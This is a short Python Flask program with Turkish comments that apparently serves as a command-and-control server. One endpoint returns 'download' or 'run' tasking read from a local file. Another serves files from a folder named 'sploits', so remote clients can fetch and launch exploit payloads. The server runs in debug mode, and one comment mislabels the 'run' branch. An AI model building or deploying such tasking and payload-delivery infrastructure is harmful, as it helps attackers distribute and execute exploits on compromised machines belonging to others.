from flask import Flask, send_from_directory, abort
import os

app = Flask(__name__)

# "sploits" klasörünün yolu
SPLOITS_FOLDER = "sploits"
os.makedirs(SPLOITS_FOLDER, exist_ok=True)  # Eğer klasör yoksa oluştur


@app.route("/command")
def commandapp():
    try:
        # 'tele' dosyasını okuyun
        with open("tele", "r") as f:
            tele = f.read().strip().split()

        # Dosyadaki komutları analiz edin
        if len(tele) > 1 and tele[0] == "download":
            return "down "+tele[1]  # Eğer komut 'download' ise dosya adını döndürün
        if len(tele) > 1 and tele[0] == "run":
            return "run "+tele[1]  # Eğer komut 'download' ise dosya adını döndürün
        else:
            return "Geçersiz komut veya dosya adı eksik", 400  # Geçersiz komut için 400 döndürün
    except FileNotFoundError:
        return "Dosya bulunamadı", 404  # Dosya eksikse 404 hatası döndürün
    except Exception as e:
        return f"Bir hata oluştu: {str(e)}", 500  # Genel bir hata için 500 döndürün




# İndirme Endpoint'i
@app.route("/download/<filename>")
def download_file(filename):
    try:
        # Sadece "sploits" klasöründen dosya indirme izni
        return send_from_directory(SPLOITS_FOLDER, filename, as_attachment=True)
    except FileNotFoundError:
        abort(404, description="Dosya bulunamadı")


if __name__ == "__main__":
    app.run(debug=True)
